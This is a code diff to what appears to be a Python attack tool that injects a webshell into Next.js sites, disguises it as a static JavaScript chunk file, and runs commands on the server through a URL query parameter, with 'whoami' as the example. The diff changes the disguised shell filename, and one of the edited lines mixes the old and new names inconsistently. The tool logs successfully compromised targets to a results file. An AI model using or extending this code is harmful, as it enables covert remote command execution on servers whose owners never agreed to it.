@@ -66,7 +66,7 @@ def gen_webshell_payload():
 
 def check_webshell(target):
     target_part = target.split('/')
-    shell_url = f'{target_part[0]}//{target_part[2]}/_next/static/chunks/173-19c5dae138f93b4a.js'
+    shell_url = f'{target_part[0]}//{target_part[2]}/_next/static/chunks/180-19c5138f93b4a.js'
     header = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
         'Origin': f'{target}',
@@ -137,13 +137,13 @@ def get_webshell_main(target):
         get_webshell(target=target)
         if check_webshell(target=target):
             print(Fore.GREEN + '[*] Shell inject success!')
-            print(Fore.GREEN + f'[*] {target}/_next/static/chunks/173-19c5dae138f93b4a.js?version=whoami')
-            logger(filename='results.txt', io_type='a', string=f'[shell] {target}/_next/static/chunks/173-19c5dae138f93b4a.js?version=whoami\n\n')
+            print(Fore.GREEN + f'[*] {target}/_next/static/chunks/180-19c5138f93b4a.js?version=whoami')
+            logger(filename='results.txt', io_type='a', string=f'[shell] {target}/_next/static/chunks/180-19c5138f93b4a.js?version=whoami\n\n')
         else:
             print(Fore.RED + '[-] Shell inject failed!')
     else:
         print(Fore.WHITE + '[+] Shell already exist!')
-        print(Fore.WHITE + f'[*] {target}/_next/static/chunks/173-19c5dae138f93b4a.js?version=whoami')
+        print(Fore.WHITE + f'[*] {target}/_next/static/chunks/173-19c5138f93b4a.js?version=whoami')
 
 
 
@@ -177,7 +177,7 @@ def exec_cmd_base64(target, cmd):
 
 def exec_cmd_shell(target, cmd):
     target_part = target.split('/')
-    shell_url = f'{target_part[0]}//{target_part[2]}/_next/static/chunks/173-19c5dae138f93b4a.js?version={cmd}'
+    shell_url = f'{target_part[0]}//{target_part[2]}/_next/static/chunks/180-19c5138f93b4a.js?version={cmd}'
     header = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
         'Origin': f'{target}',
@@ -266,4 +266,5 @@ def run():
 
 
 if __name__ == '__main__':
+
     run()
